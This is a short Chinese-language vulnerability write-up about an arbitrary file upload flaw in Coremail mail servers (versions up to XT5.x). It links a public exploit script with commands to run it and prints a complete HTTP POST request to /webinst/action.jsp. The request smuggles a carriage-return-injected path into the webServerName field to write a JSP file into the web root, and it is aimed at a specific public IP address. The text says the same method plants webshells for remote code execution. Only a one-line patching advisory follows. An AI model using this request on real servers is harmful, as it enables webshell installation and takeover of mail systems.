# Coremail文件上传漏洞POC - 钓鱼
漏洞信息
----

coremail产品诞生于1999年，经过二十多年发展，如今从亿万级别的运营系统，到几万人的大型企业，都有了Coremail的客户。截止2020年，Coremail邮件系统产品在国内已拥有10亿终端用户，是目前国内拥有邮箱使用用户最多的邮件系统。其特定版本范围内存在任意文件上传漏洞，攻击者可以上传webshell，从而造成远程代码执行。该漏洞为Nday，非hw期间漏洞。

漏洞危害:
-----

其特定版本范围内存在任意文件上传漏洞，攻击者可以上传webshell，从而造成远程代码执行。

影响范围:
-----

Coremail <= XT5.x

漏洞复现:
-----

使用网上流传POC 进行验证 `https://github.com/xiaoshu-bit/CoreMailUploadRce`

    pip3 install -r requirements.txt
    python3 coremail_upload.py -u http://127.0.0.1:1111

文件上传poc：

    POST /webinst/action.jsp HTTP/1.1
    Host: 120.136.129.10
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 99
    Connection: close
    
    func=checkserver&webServerName=127.0.0.1:6132/%0d@/home/coremail/web/webapp/justtest.jsp%20JUSTTEST

文件内容上传，将会在/home/coremail/web/webapp/目录下上传一个justtest.jsp的文件

![image.png](Coremail%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EPOC%20-%20%E9%92%93%E9%B1%BC/1618123234_607299e22c002b2107131.png!small)

成功上传。也可用于上传webshell文件。从而造成远程代码执行。

![image.png](Coremail%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9EPOC%20-%20%E9%92%93%E9%B1%BC/1618123242_607299ea6db16da257f0f.png!small)

修复方案:
-----

目前coremail官方已经发布了解决此漏洞的软件更新，建议受影响用户尽快升级到安全版本，